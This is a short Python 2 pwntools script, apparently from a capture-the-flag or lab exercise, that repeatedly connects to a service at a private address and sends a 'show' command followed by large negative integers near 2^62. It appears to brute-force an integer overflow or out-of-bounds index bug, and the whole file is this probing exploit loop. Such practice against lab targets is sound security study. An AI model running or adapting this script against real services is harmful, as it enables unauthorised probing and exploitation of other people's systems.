#!/usr/bin/env python2
# encoding: utf-8
from __future__ import print_function

from pwnlib import context
context.log_level = 'error'

from pwnlib.tubes.remote import remote


for i in range(4611686018427387604, 4611686018427387904):
    r = remote('192.168.56.101', 53121)
    #for j in range(10):
    #    r.send("new\nset\n{}\n".format(j) + "A" * 32 + "\n")
    print(r.recv())
    r.send("show\n")
    print(r.recv())
    r.send("-{}\n".format(i))
    try:
        print(r.recv())
    except:
        pass
    r.close()
